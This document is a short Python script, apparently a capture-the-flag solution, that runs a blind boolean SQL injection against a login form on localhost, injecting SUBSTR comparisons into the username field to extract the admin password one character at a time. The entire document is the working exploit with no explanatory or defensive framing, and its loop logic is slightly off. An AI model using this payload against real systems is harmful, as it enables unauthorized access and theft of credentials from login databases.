import requests


password = ""


charlist = 'abcdefghijklmnopqrstuvwxyz1234567890{}'

url = "http://localhost:5006/"

for index in range(0, 30):
    for char in charlist:
        request_text = f"admin' AND SUBSTR(password, {index}, 1) = '{char}'--"
        data = {"username": request_text, "pass": ""}
        response = requests.post(url, data)
        if response.text.find('Welcome, admin!') != -1:
            password += char
            print(password)
            continue 
